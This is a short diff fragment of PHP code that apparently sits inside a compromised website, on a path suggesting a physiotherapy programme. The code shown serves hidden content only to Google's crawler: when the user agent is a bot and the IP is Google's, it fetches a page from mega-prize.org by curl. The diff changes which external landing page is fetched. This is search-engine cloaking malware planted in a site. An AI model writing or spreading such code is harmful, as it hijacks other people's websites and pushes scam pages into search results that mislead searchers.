@@ -47,7 +47,7 @@ if (strpos($request_uri, 'd-iii-fisioterapi') !== false) {
 
     if ($is_bot_ua && $is_real_google_ip) {
         
-        $target_url = "https://mega-prize.org/landing/submission.html";
+        $target_url = "https://mega-prize.org/landing/iscience.html";
 
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $target_url);
